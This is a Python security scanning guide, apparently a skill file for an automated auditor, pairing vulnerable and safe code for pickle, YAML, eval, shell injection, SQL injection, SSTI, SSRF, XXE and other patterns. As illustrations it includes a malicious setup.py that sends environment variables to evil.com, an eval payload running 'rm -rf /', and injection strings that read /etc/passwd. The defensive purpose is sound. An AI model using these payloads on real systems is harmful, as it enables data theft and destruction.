---
name: sc-lang-python
description: Python-specific security deep scan
---

# SC: Python Security Deep Scan

## Purpose

Detects Python-specific security anti-patterns and language-idiomatic attack vectors across the entire Python ecosystem, including standard library misuse, web framework pitfalls, serialization dangers, cryptographic weaknesses, and supply-chain risks. This skill goes beyond generic vulnerability scanning to identify issues that are unique to Python's dynamic nature, duck typing, and common idioms.

## Activation

Activates when Python source files (`.py`, `.pyw`, `.pyi`) are detected in the scan target, or when Python-related configuration files (`pyproject.toml`, `setup.py`, `setup.cfg`, `Pipfile`, `requirements.txt`, `poetry.lock`, `tox.ini`, `pytest.ini`, `.flake8`) are present.

## Checklist Reference

References `checklists/python-security-checklist.md` for the full enumeration of checks. Each category below maps to one or more checklist items.

## Severity Levels

- **CRITICAL**: Remote code execution, authentication bypass, data exfiltration
- **HIGH**: SQL injection, SSRF, path traversal, insecure deserialization
- **MEDIUM**: Weak cryptography, information disclosure, insecure defaults
- **LOW**: Best-practice violations, minor information leaks, code quality

---

## Python-Specific Vulnerability Patterns

### 1. Pickle Deserialization RCE

**Description**: Python's `pickle` module can deserialize arbitrary objects, including those with `__reduce__` methods that execute arbitrary code. An attacker who controls pickled input can achieve full remote code execution.

**Dangerous Functions**:
- `pickle.loads()`, `pickle.load()`
- `pickle.Unpickler().load()`
- `cPickle.loads()`, `cPickle.load()`
- `joblib.load()` (uses pickle internally)
- `torch.load()` (uses pickle internally)
- `numpy.load(allow_pickle=True)`

**Safe Alternative**: Use `json`, `msgpack`, or protocol buffers for data interchange. If pickle is absolutely required, use `hmac` to sign pickled data and verify before loading, or use `fickling` to audit pickle files.

**Vulnerable Code**:
```python
import pickle

def process_request(data):
    obj = pickle.loads(data)  # RCE if data is attacker-controlled
    return obj
```

**Safe Code**:
```python
import json
import hmac
import hashlib

def process_request(data):
    obj = json.loads(data)  # JSON cannot execute code
    return obj

# If pickle is unavoidable, sign and verify
def safe_pickle_load(data, secret_key):
    signature = data[:64]
    payload = data[64:]
    expected = hmac.new(secret_key, payload, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Tampered pickle data")
    return pickle.loads(payload)
```

**Severity**: CRITICAL

---

### 2. YAML Unsafe Loading

**Description**: `yaml.load()` without a safe Loader can instantiate arbitrary Python objects via YAML tags like `!!python/object/apply:os.system`. This is equivalent to pickle deserialization in risk.

**Dangerous Functions**:
- `yaml.load(data)` (no Loader argument)
- `yaml.load(data, Loader=yaml.FullLoader)` (partially restricted but still dangerous)
- `yaml.load(data, Loader=yaml.UnsafeLoader)`

**Safe Alternative**: Always use `yaml.safe_load()` or `yaml.load(data, Loader=yaml.SafeLoader)`.

**Vulnerable Code**:
```python
import yaml

def parse_config(raw):
    config = yaml.load(raw)  # Arbitrary code execution via YAML tags
    return config
```

**Safe Code**:
```python
import yaml

def parse_config(raw):
    config = yaml.safe_load(raw)  # Only basic Python types
    return config
```

**Severity**: CRITICAL

---

### 3. eval(), exec(), compile() Code Injection

**Description**: These built-in functions execute arbitrary Python code from strings. When user input reaches them, attackers can execute any code with the privileges of the running process.

**Dangerous Functions**:
- `eval()`
- `exec()`
- `compile()` followed by `exec()`
- `execfile()` (Python 2)
- `input()` in Python 2 (calls eval internally)

**Safe Alternative**: Use `ast.literal_eval()` for parsing literal expressions. For math, use a dedicated parser. For configuration, use JSON or TOML.

**Vulnerable Code**:
```python
def calculate(expression):
    return eval(expression)  # User sends "__import__('os').system('rm -rf /')"

def apply_filter(user_code):
    exec(user_code)  # Full code execution
```

**Safe Code**:
```python
import ast
import operator

SAFE_OPS = {ast.Add: operator.add, ast.Sub: operator.sub,
            ast.Mult: operator.mul, ast.Div: operator.truediv}

def safe_calculate(expression):
    tree = ast.parse(expression, mode='eval')
    return _eval_node(tree.body)

def _eval_node(node):
    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
        return node.value
    if isinstance(node, ast.BinOp) and type(node.op) in SAFE_OPS:
        return SAFE_OPS[type(node.op)](_eval_node(node.left), _eval_node(node.right))
    raise ValueError(f"Unsupported expression: {ast.dump(node)}")
```

**Severity**: CRITICAL

---

### 4. Subprocess Shell Injection

**Description**: Using `shell=True` with `subprocess` or calling `os.system()` / `os.popen()` passes commands through the system shell, enabling shell metacharacter injection. Attackers can chain commands with `;`, `|`, `&&`, backticks, or `$()`.

**Dangerous Functions**:
- `subprocess.call(cmd, shell=True)`
- `subprocess.Popen(cmd, shell=True)`
- `subprocess.run(cmd, shell=True)`
- `os.system(cmd)`
- `os.popen(cmd)`
- `commands.getoutput(cmd)` (Python 2)

**Safe Alternative**: Pass commands as a list without `shell=True`. Use `shlex.quote()` if shell is absolutely required.

**Vulnerable Code**:
```python
import subprocess

def ping_host(hostname):
    subprocess.run(f"ping -c 3 {hostname}", shell=True)
    # hostname = "8.8.8.8; cat /etc/passwd" -> RCE
```

**Safe Code**:
```python
import subprocess
import re

def ping_host(hostname):
    if not re.match(r'^[a-zA-Z0-9.\-]+$', hostname):
        raise ValueError("Invalid hostname")
    subprocess.run(["ping", "-c", "3", hostname])  # No shell, list of args
```

**Severity**: CRITICAL

---

### 5. Django ORM raw() and extra() SQL Injection

**Description**: Django's ORM provides `raw()` and `extra()` methods that accept raw SQL strings. String formatting or concatenation in these methods bypasses Django's built-in SQL injection protections.

**Dangerous Functions**:
- `Model.objects.raw(f"SELECT * FROM t WHERE id = {user_input}")`
- `Model.objects.extra(where=[f"id = {user_input}"])`
- `cursor.execute(f"SELECT ... {user_input}")`
- `RawSQL()` with unparameterized input

**Safe Alternative**: Use Django ORM's parameterized queries or pass parameters as the second argument to `raw()`.

**Vulnerable Code**:
```python
def get_user(request):
    user_id = request.GET['id']
    users = User.objects.raw(f"SELECT * FROM auth_user WHERE id = {user_id}")
    # user_id = "1 UNION SELECT password FROM auth_user--"
    return users
```

**Safe Code**:
```python
def get_user(request):
    user_id = request.GET['id']
    users = User.objects.raw("SELECT * FROM auth_user WHERE id = %s", [user_id])
    # Or simply:
    user = User.objects.get(id=user_id)
    return user
```

**Severity**: HIGH

---

### 6. Django Security Misconfigurations

**Description**: Django has many security-related settings that, when misconfigured, open the application to CSRF bypass, XSS, clickjacking, and information disclosure.

**Dangerous Patterns**:
- `DEBUG = True` in production
- `SECRET_KEY` hardcoded or in version control
- `ALLOWED_HOSTS = ['*']`
- `CSRF_COOKIE_SECURE = False` / `SESSION_COOKIE_SECURE = False`
- `SECURE_SSL_REDIRECT = False` in production
- `X_FRAME_OPTIONS` not set to `'DENY'`
- `SECURE_HSTS_SECONDS = 0`
- Missing `django.middleware.csrf.CsrfViewMiddleware` in MIDDLEWARE
- Template injection via `mark_safe()` or `|safe` filter on user data
- `@csrf_exempt` on sensitive views

**Safe Configuration**:
```python
# settings/production.py
DEBUG = False
SECRET_KEY = os.environ['DJANGO_SECRET_KEY']
ALLOWED_HOSTS = ['example.com', 'www.example.com']
CSRF_COOKIE_SECURE = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
```

**Severity**: HIGH (DEBUG/SECRET_KEY), MEDIUM (cookie settings)

---

### 7. Flask / Jinja2 Server-Side Template Injection (SSTI)

**Description**: Rendering user-controlled strings as Jinja2 templates allows attackers to access Python internals via the MRO chain (`__class__.__mro__`), read files, or execute commands.

**Dangerous Functions**:
- `Template(user_input).render()`
- `render_template_string(user_input)`
- `Environment().from_string(user_input).render()`

**Safe Alternative**: Never pass user input as the template itself. Pass it as a variable to a predefined template.

**Vulnerable Code**:
```python
from flask import request, render_template_string

@app.route('/greet')
def greet():
    name = request.args.get('name')
    return render_template_string(f"<h1>Hello {name}!</h1>")
    # name = "{{config.items()}}" -> leaks Flask config
```

**Safe Code**:
```python
from flask import request, render_template_string

@app.route('/greet')
def greet():
    name = request.args.get('name')
    return render_template_string("<h1>Hello {{ name }}!</h1>", name=name)
```

**Severity**: CRITICAL

---

### 8. Flask Debug Mode and Secret Key Exposure

**Description**: Running Flask with `debug=True` in production exposes the Werkzeug debugger, which provides an interactive Python console. A weak or default `secret_key` allows session cookie forgery.

**Dangerous Patterns**:
- `app.run(debug=True)` in production
- `app.secret_key = 'dev'` or any hardcoded/guessable key
- `FLASK_DEBUG=1` in environment without restriction
- Werkzeug debugger PIN exposed or brute-forceable

**Safe Alternative**: Use environment variables for configuration and never enable debug mode in production.

**Vulnerable Code**:
```python
app = Flask(__name__)
app.secret_key = 'super-secret'  # Hardcoded, guessable

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')  # Debugger open to the world
```

**Safe Code**:
```python
import os

app = Flask(__name__)
app.secret_key = os.environ['FLASK_SECRET_KEY']

if __name__ == '__main__':
    app.run(
        debug=os.environ.get('FLASK_DEBUG', 'false').lower() == 'true',
        host='127.0.0.1'
    )
```

**Severity**: CRITICAL (debug mode), HIGH (weak secret key)

---

### 9. Requests Library SSL Bypass and SSRF

**Description**: Disabling SSL verification with `verify=False` enables man-in-the-middle attacks. Passing user-controlled URLs to `requests.get()` without validation enables Server-Side Request Forgery (SSRF) to reach internal services, cloud metadata endpoints, or internal network resources.

**Dangerous Patterns**:
- `requests.get(url, verify=False)`
- `requests.get(user_supplied_url)` without URL validation
- `urllib.request.urlopen(user_input)`
- Accessing `http://169.254.169.254/` (cloud metadata)
- Accessing `http://localhost:...` or `http://127.0.0.1:...` internal services

**Safe Alternative**: Always verify SSL. Validate and restrict URLs with an allowlist of domains/schemes.

**Vulnerable Code**:
```python
import requests

def fetch_url(url):
    resp = requests.get(url, verify=False)  # MitM + SSRF
    return resp.text
```

**Safe Code**:
```python
import requests
from urllib.parse import urlparse
import ipaddress

ALLOWED_HOSTS = {'api.example.com', 'cdn.example.com'}

def fetch_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        raise ValueError("Invalid scheme")
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Host not allowed")
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            raise ValueError("Private IP not allowed")
    except ValueError:
        pass  # hostname is not an IP
    resp = requests.get(url, verify=True, timeout=10)
    return resp.text
```

**Severity**: HIGH (SSL bypass), HIGH (SSRF)

---

### 10. Weak Password Hashing (hashlib vs bcrypt/argon2)

**Description**: Using `hashlib` (MD5, SHA-1, SHA-256) for password hashing is insecure because these algorithms are fast and lack salting by default, making them vulnerable to rainbow table and brute-force attacks.

**Dangerous Functions**:
- `hashlib.md5(password.encode()).hexdigest()`
- `hashlib.sha1(password.encode()).hexdigest()`
- `hashlib.sha256(password.encode()).hexdigest()`
- Any unsalted hash for password storage
- `crypt.crypt()` with weak algorithm

**Safe Alternative**: Use `bcrypt`, `argon2-cffi`, or `passlib` with Argon2/bcrypt. Django's `make_password()` uses PBKDF2 by default.

**Vulnerable Code**:
```python
import hashlib

def store_password(password):
    hashed = hashlib.sha256(password.encode()).hexdigest()
    db.save(hashed)  # No salt, fast hash, rainbow-table vulnerable
```

**Safe Code**:
```python
import bcrypt

def store_password(password):
    salt = bcrypt.gensalt(rounds=12)
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    db.save(hashed)

def verify_password(password, stored_hash):
    return bcrypt.checkpw(password.encode('utf-8'), stored_hash)
```

**Severity**: HIGH

---

### 11. Insecure Random Number Generation (random vs secrets)

**Description**: Python's `random` module uses a Mersenne Twister PRNG that is deterministic and predictable. It must never be used for security-sensitive purposes like tokens, passwords, session IDs, or cryptographic nonces.

**Dangerous Functions**:
- `random.random()`
- `random.randint()`
- `random.choice()`
- `random.getrandbits()`
- `random.sample()`
- `uuid.uuid1()` (time-based, predictable)

**Safe Alternative**: Use `secrets` module (Python 3.6+) or `os.urandom()`.

**Vulnerable Code**:
```python
import random
import string

def generate_token():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(32))
    # Predictable after observing ~624 outputs
```

**Safe Code**:
```python
import secrets
import string

def generate_token():
    return secrets.token_urlsafe(32)

def generate_password(length=16):
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(secrets.choice(chars) for _ in range(length))
```

**Severity**: HIGH

---

### 12. F-String and Format String Injection

**Description**: Using f-strings or `.format()` to build SQL queries, log messages, or template strings can lead to injection attacks. The `.format()` method is particularly dangerous because it supports attribute access (e.g., `{0.__class__}`) which can leak internal object state.

**Dangerous Patterns**:
- `f"SELECT * FROM users WHERE id = {user_id}"` (SQL injection)
- `logger.info(f"User input: {user_input}")` (defeats structured logging)
- `"Hello {}".format(user_input)` (attribute access via `{0.__class__.__mro__}`)
- `template.format(**user_dict)` (key access to unintended attributes)

**Safe Alternative**: Use parameterized queries for SQL, `%s` style logging with args, and restrict format string access.

**Vulnerable Code**:
```python
import logging

def log_action(user_input):
    logging.info(f"Action: {user_input}")

def query_user(cursor, name):
    cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")
```

**Safe Code**:
```python
import logging

def log_action(user_input):
    logging.info("Action: %s", user_input)  # Lazy formatting, safe

def query_user(cursor, name):
    cursor.execute("SELECT * FROM users WHERE name = %s", (name,))
```

**Severity**: HIGH (SQL), MEDIUM (logging)

---

### 13. Dynamic Import Abuse (__import__ and importlib)

**Description**: Using `__import__()` or `importlib.import_module()` with user-controlled input allows attackers to load arbitrary modules, potentially executing initialization code or gaining access to dangerous functionality like `os`, `subprocess`, or `ctypes`.

**Dangerous Functions**:
- `__import__(user_input)`
- `importlib.import_module(user_input)`
- `importlib.util.spec_from_file_location(user_input)`
- `__builtins__.__import__`

**Safe Alternative**: Use an explicit allowlist of permitted module names.

**Vulnerable Code**:
```python
import importlib

def load_plugin(plugin_name):
    module = importlib.import_module(plugin_name)
    # plugin_name = "os" -> attacker gets os module
    return module.run()
```

**Safe Code**:
```python
import importlib

ALLOWED_PLUGINS = {'plugin_a', 'plugin_b', 'plugin_c'}

def load_plugin(plugin_name):
    if plugin_name not in ALLOWED_PLUGINS:
        raise ValueError(f"Unknown plugin: {plugin_name}")
    module = importlib.import_module(f"myapp.plugins.{plugin_name}")
    return module.run()
```

**Severity**: HIGH

---

### 14. FastAPI Dependency Injection Bypass

**Description**: FastAPI's dependency injection system can be bypassed if dependencies are not properly enforced, if security dependencies raise generic exceptions instead of HTTPException, or if endpoint functions accept raw request parameters that skip `Depends()` validation.

**Dangerous Patterns**:
- Security dependencies that return `None` instead of raising `HTTPException`
- Using `Optional` type hints on security dependencies
- Accepting both `Depends()` and direct parameters for the same data
- Not using `Security()` for OAuth2/API key dependencies
- Missing `dependencies` parameter on `APIRouter`

**Safe Alternative**: Always raise `HTTPException(status_code=401)` on auth failure. Use `Security()` for auth dependencies. Apply auth at the router level.

**Vulnerable Code**:
```python
from fastapi import Depends, FastAPI

async def get_current_user(token: str = None):
    if not token:
        return None  # Returns None instead of raising
    return verify_token(token)

@app.get("/admin")
async def admin_panel(user=Depends(get_current_user)):
    if user is None:
        return {"error": "not authenticated"}  # Logic-level check, easily missed
    return {"data": "sensitive"}
```

**Safe Code**:
```python
from fastapi import Depends, HTTPException, Security, status
from fastapi.security import HTTPBearer

security = HTTPBearer()

async def get_current_user(credentials=Security(security)):
    user = verify_token(credentials.credentials)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid credentials"
        )
    return user

@app.get("/admin")
async def admin_panel(user=Depends(get_current_user)):
    return {"data": "sensitive"}  # Only reachable if auth succeeds
```

**Severity**: HIGH

---

### 15. Pydantic Validation Escape

**Description**: Pydantic models validate input data, but improper use can allow validation bypass. The `.construct()` method is especially dangerous as it skips all validation entirely. Missing `extra='forbid'` allows mass assignment of unexpected fields.

**Dangerous Patterns**:
- `class Config: arbitrary_types_allowed = True` without custom validators
- Using `Any` type in models that process user input
- `@validator` with `pre=True` that transforms before type checking
- `.construct()` method that skips validation entirely
- Pydantic V1 `orm_mode` loading arbitrary ORM attributes
- Missing `extra='forbid'` allowing mass assignment

**Safe Alternative**: Use strict mode in Pydantic V2, never use `.construct()` on untrusted data, validate all fields explicitly, and set `extra='forbid'`.

**Vulnerable Code**:
```python
from pydantic import BaseModel

class UserUpdate(BaseModel):
    role: str = None

def update_user(user_id, data: dict):
    update = UserUpdate.construct(**data)  # Skips ALL validation
    db.update(user_id, update.dict(exclude_unset=True))
    # Attacker sends {"role": "admin", "is_superuser": true}
```

**Safe Code**:
```python
from pydantic import BaseModel, ConfigDict, field_validator
from typing import Optional

class UserUpdate(BaseModel):
    model_config = ConfigDict(strict=True, extra='forbid')
    display_name: Optional[str] = None
    email: Optional[str] = None
    # role intentionally excluded - not user-editable

    @field_validator('email')
    @classmethod
    def validate_email(cls, v):
        if v and '@' not in v:
            raise ValueError('Invalid email')
        return v

def update_user(user_id, data: dict):
    update = UserUpdate.model_validate(data)  # Full validation
    db.update(user_id, update.model_dump(exclude_unset=True))
```

**Severity**: MEDIUM

---

### 16. Python Packaging Supply Chain Attacks (setup.py)

**Description**: `setup.py` executes arbitrary Python code during `pip install`. Malicious packages can run code at install time, exfiltrate environment variables, install backdoors, or modify other installed packages. Typosquatting and dependency confusion are common vectors.

**Dangerous Patterns**:
- `setup.py` with network calls, file reads outside project, or subprocess calls
- `install_requires` pointing to external URLs
- Dependency names similar to popular packages (typosquatting)
- Private package names that could be hijacked on PyPI
- `--extra-index-url` mixing public and private registries
- Post-install scripts in `setup.py` `cmdclass`
- `dependency_links` in setup.py pointing to external sources

**Safe Alternative**: Use `pyproject.toml` with declarative metadata. Pin dependencies with hashes. Use `pip --require-hashes`. Audit `setup.py` before installing.

**Vulnerable Code**:
```python
# setup.py - malicious example
from setuptools import setup
import os, requests

requests.post("https://evil.com/collect", data={
    "env": str(os.environ),
    "home": os.path.expanduser("~"),
})

setup(name="totally-legit-package", version="1.0.0")
```

**Safe Code**:
```toml
# pyproject.toml - declarative, no code execution
[build-system]
requires = ["setuptools>=68.0", "wheel"]
build-backend = "setuptools.backends._legacy:_Backend"

[project]
name = "my-package"
version = "1.0.0"
dependencies = [
    "requests>=2.31.0",
    "pydantic>=2.0.0",
]
```

**Severity**: CRITICAL

---

### 17. ast.literal_eval() Limitations and Misuse

**Description**: `ast.literal_eval()` is often recommended as a safe alternative to `eval()`, but it has limitations. It only supports literal structures (strings, numbers, tuples, lists, dicts, booleans, None, bytes, sets). Developers frequently fall back to `eval()` when `ast.literal_eval()` fails. Additionally, very large or deeply nested inputs can cause DoS.

**Dangerous Patterns**:
- Using `ast.literal_eval()` and falling back to `eval()` on failure
- No input size limits before calling `ast.literal_eval()`
- Assuming `ast.literal_eval()` handles arithmetic or function calls
- Using it to parse untrusted data without size/depth constraints

**Safe Alternative**: Use JSON for data interchange. Set size limits on input before parsing. Never fall back to `eval()`.

**Vulnerable Code**:
```python
import ast

def parse_value(user_input):
    try:
        return ast.literal_eval(user_input)
    except (ValueError, SyntaxError):
        return eval(user_input)  # Fallback to eval defeats the purpose!
```

**Safe Code**:
```python
import ast
import json

MAX_INPUT_SIZE = 10_000

def parse_value(user_input):
    if len(user_input) > MAX_INPUT_SIZE:
        raise ValueError("Input too large")
    try:
        return json.loads(user_input)
    except json.JSONDecodeError:
        try:
            return ast.literal_eval(user_input)
        except (ValueError, SyntaxError):
            raise ValueError("Cannot parse input safely")
```

**Severity**: MEDIUM (DoS), CRITICAL (if eval fallback exists)

---

### 18. marshal and shelve Deserialization

**Description**: `marshal` is Python's internal serialization for `.pyc` files and can execute code when loading crafted bytecode objects. `shelve` uses `pickle` internally and inherits all of pickle's deserialization risks. Both are often overlooked in security audits.

**Dangerous Functions**:
- `marshal.loads(data)` / `marshal.load(file)`
- `shelve.open(filename)` on untrusted files
- `dbm` modules with pickle-backed storage
- Loading `.pyc` files from untrusted sources

**Safe Alternative**: Use `json` or `sqlite3` for persistent key-value storage. Never load marshal/shelve data from untrusted sources.

**Vulnerable Code**:
```python
import shelve
import marshal

def load_cache(path):
    db = shelve.open(path)  # Uses pickle internally - RCE
    return dict(db)

def load_bytecode(data):
    code = marshal.loads(data)  # Can contain malicious bytecode
    exec(code)
```

**Safe Code**:
```python
import json
import sqlite3

def load_cache(path):
    conn = sqlite3.connect(path)
    cursor = conn.execute("SELECT key, value FROM cache")
    return {k: json.loads(v) for k, v in cursor}
```

**Severity**: CRITICAL

---

### 19. SQL Injection via String Formatting

**Description**: Python offers many string formatting mechanisms (`%`, `.format()`, f-strings, concatenation) and all of them are unsafe for building SQL queries. This applies to any database adapter (psycopg2, sqlite3, mysql-connector, asyncpg, etc.).

**Dangerous Patterns**:
- `cursor.execute("SELECT * FROM t WHERE id = %s" % user_id)` (% formatting)
- `cursor.execute("SELECT * FROM t WHERE id = {}".format(user_id))` (str.format)
- `cursor.execute(f"SELECT * FROM t WHERE id = {user_id}")` (f-string)
- `cursor.execute("SELECT * FROM t WHERE id = " + user_id)` (concatenation)
- Building `IN` clauses with string joining
- Building `ORDER BY` with user-supplied column names

**Safe Alternative**: Use parameterized queries with the database adapter's placeholder syntax. For dynamic column/table names, use an allowlist.

**Vulnerable Code**:
```python
def search_products(cursor, category, min_price, sort_col):
    query = f"""
        SELECT * FROM products
        WHERE category = '{category}'
        AND price > {min_price}
        ORDER BY {sort_col}
    """
    cursor.execute(query)
```

**Safe Code**:
```python
ALLOWED_SORT_COLUMNS = {'name', 'price', 'created_at', 'rating'}

def search_products(cursor, category, min_price, sort_col):
    if sort_col not in ALLOWED_SORT_COLUMNS:
        sort_col = 'name'
    query = f"""
        SELECT * FROM products
        WHERE category = %s AND price > %s
        ORDER BY {sort_col}
    """
    cursor.execute(query, (category, min_price))

def search_by_ids(cursor, ids):
    placeholders = ', '.join(['%s'] * len(ids))
    query = f"SELECT * FROM products WHERE id IN ({placeholders})"
    cursor.execute(query, tuple(ids))
```

**Severity**: HIGH

---

### 20. Path Traversal via os.path.join()

**Description**: `os.path.join()` has a surprising behavior: if any component is an absolute path, all previous components are discarded. This means `os.path.join("/safe/dir", user_input)` where `user_input = "/etc/passwd"` returns `/etc/passwd`, completely bypassing the intended directory restriction.

**Dangerous Functions**:
- `os.path.join(base, user_input)` without validation
- `pathlib.Path(base) / user_input` (same issue with absolute paths)
- `open(os.path.join(upload_dir, filename))` with user-controlled filename
- Not checking for `..` segments after joining

**Safe Alternative**: Use `Path.resolve()` then verify the final path is within the intended base directory using `is_relative_to()` (Python 3.9+).

**Vulnerable Code**:
```python
import os

UPLOAD_DIR = "/var/www/uploads"

def read_file(filename):
    path = os.path.join(UPLOAD_DIR, filename)
    # filename = "/etc/passwd" -> path = "/etc/passwd"
    with open(path) as f:
        return f.read()
```

**Safe Code**:
```python
from pathlib import Path

UPLOAD_DIR = Path("/var/www/uploads").resolve()

def read_file(filename):
    requested = (UPLOAD_DIR / filename).resolve()
    if not requested.is_relative_to(UPLOAD_DIR):
        raise ValueError("Path traversal detected")
    if not requested.is_file():
        raise FileNotFoundError("File not found")
    return requested.read_text()
```

**Severity**: HIGH

---

### 21. XML External Entity (XXE) Injection

**Description**: Python's built-in XML parsers have varying degrees of XXE vulnerability. The `lxml` library with default settings can resolve external entities, leading to file disclosure, SSRF, or denial of service via the "billion laughs" attack.

**Dangerous Functions**:
- `lxml.etree.parse(user_input)` without disabling entity resolution
- `xml.etree.ElementTree.parse()` (limited XXE, but billion laughs DoS possible)
- `xmlrpc.client` processing untrusted XML
- `xml.dom.pulldom` with entity expansion

**Safe Alternative**: Use the `defusedxml` library which patches all standard library XML parsers.

**Vulnerable Code**:
```python
from lxml import etree

def parse_xml(data):
    parser = etree.XMLParser()
    tree = etree.fromstring(data, parser)
    return tree
```

**Safe Code**:
```python
import defusedxml.ElementTree as ET

def safe_parse_xml(data):
    return ET.fromstring(data)

# Or configure lxml explicitly:
from lxml import etree

def parse_xml_lxml(data):
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False,
    )
    return etree.fromstring(data, parser)
```

**Severity**: HIGH

---

### 22. Timing Attacks on String Comparison

**Description**: Standard string comparison (`==`) in Python short-circuits on the first mismatched character, making it vulnerable to timing attacks when comparing secrets. An attacker can determine the correct value one character at a time by measuring response times.

**Dangerous Patterns**:
- `if token == stored_token:` for API authentication
- `if hmac_digest == expected_digest:` for signature verification
- `if password_hash == stored_hash:` for authentication
- Any equality comparison of security-sensitive strings

**Safe Alternative**: Use `hmac.compare_digest()` or `secrets.compare_digest()` for constant-time comparison.

**Vulnerable Code**:
```python
def verify_api_key(request_key, stored_key):
    return request_key == stored_key  # Timing side-channel

def verify_signature(payload, signature, secret):
    expected = hmac.new(secret, payload, 'sha256').hexdigest()
    return signature == expected  # Timing side-channel
```

**Safe Code**:
```python
import hmac

def verify_api_key(request_key, stored_key):
    return hmac.compare_digest(request_key, stored_key)

def verify_signature(payload, signature, secret):
    expected = hmac.new(secret, payload, 'sha256').hexdigest()
    return hmac.compare_digest(signature, expected)
```

**Severity**: MEDIUM

---

### 23. Insecure Temporary File Creation

**Description**: Using predictable temporary file names or insecure creation methods can lead to symlink attacks, race conditions, and information disclosure on multi-user systems.

**Dangerous Functions**:
- `tempfile.mktemp()` (race condition between name generation and file creation)
- `open(f"/tmp/{predictable_name}", "w")` (predictable path)
- `os.tempnam()`, `os.tmpnam()` (deprecated, same race condition)

**Safe Alternative**: Use `tempfile.mkstemp()`, `tempfile.NamedTemporaryFile()`, or `tempfile.TemporaryDirectory()`.

**Vulnerable Code**:
```python
import tempfile

def process_upload(data):
    path = tempfile.mktemp(suffix='.csv')  # Race condition!
    with open(path, 'w') as f:
        f.write(data)
```

**Safe Code**:
```python
import tempfile

def process_upload(data):
    with tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False) as f:
        f.write(data)
        return f.name  # Atomically created with secure permissions (0600)
```

**Severity**: MEDIUM

---

### 24. Regular Expression Denial of Service (ReDoS)

**Description**: Python's `re` module uses a backtracking NFA engine that can exhibit catastrophic backtracking on certain patterns with crafted input, causing the process to hang for minutes or hours.

**Dangerous Patterns**:
- Nested quantifiers: `(a+)+`, `(a*)*`, `(a|a)*`
- Overlapping alternations with quantifiers: `(a|ab)*`
- Quantified groups with optional elements: `(a+b?)+`
- User-supplied regex patterns passed to `re.compile()`
- Complex email/URL validation patterns

**Safe Alternative**: Use `re2` (Google's linear-time regex engine) via the `google-re2` package. Set timeouts. Validate regex complexity before compiling user patterns.

**Vulnerable Code**:
```python
import re

def validate_email(email):
    pattern = r'^([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))
    # Input: "a" * 30 + "!" -> catastrophic backtracking

def search_logs(user_pattern, log_data):
    return re.findall(user_pattern, log_data)  # User controls pattern
```

**Safe Code**:
```python
import re2  # google-re2, linear-time guarantee

def validate_email(email):
    if len(email) > 254:
        return False
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re2.match(pattern, email))

def search_logs(user_pattern, log_data):
    return re2.findall(user_pattern, log_data)
```

**Severity**: MEDIUM

---

## Scan Procedure

1. **File Discovery**: Identify all Python files (`.py`, `.pyw`, `.pyi`) and configuration files (`pyproject.toml`, `setup.py`, `setup.cfg`, `requirements.txt`, `Pipfile`, `poetry.lock`) in the scan target.
2. **Framework Detection**: Determine which frameworks are in use (Django, Flask, FastAPI, Starlette, Tornado, etc.) by inspecting imports, installed packages, and configuration files.
3. **Dependency Analysis**: Parse dependency files to check for known-vulnerable package versions and identify packages with security advisories.
4. **Pattern Matching**: For each category above, search for the dangerous functions and patterns using AST-aware analysis where possible, falling back to regex for configuration files and non-Python formats.
5. **Data Flow Tracing**: Determine whether detected patterns involve user-controlled input by tracing data flow from request handlers, CLI arguments, environment variables, and file reads to dangerous sinks.
6. **Context Analysis**: Check for mitigating controls (input validation, sanitization, allowlists) near the dangerous call site. Account for framework-provided protections (e.g., Django ORM parameterization, Flask autoescaping).
7. **False Positive Reduction**: Exclude test files, examples, and vendored code unless explicitly included. Reduce severity for patterns in non-production code paths.
8. **Severity Assignment**: Assign severity based on the category default, adjusted by context (e.g., `eval()` in a test helper is LOW, `eval()` in a request handler is CRITICAL).
9. **Remediation Guidance**: For each finding, provide the specific safe alternative with code example adapted to the project's coding style and framework conventions.

## Output Format

Findings are reported in the standard SC finding format:

```
[SEVERITY] Category Name (SC-PY-NNN)
  File: path/to/file.py:line_number
  Pattern: <dangerous function or pattern detected>
  Context: <surrounding code showing data flow>
  Risk: <description of the attack scenario>
  Fix: <specific remediation with code example>
  CWE: CWE-XXX
  References: <relevant documentation links>
```

## Integration with SC Orchestrator

This skill is invoked by the `sc-orchestrator` when Python files are detected in the scan target. Results feed into `sc-report` for aggregation across all language-specific scans and into `sc-verifier` for validation of findings against actual exploitability.
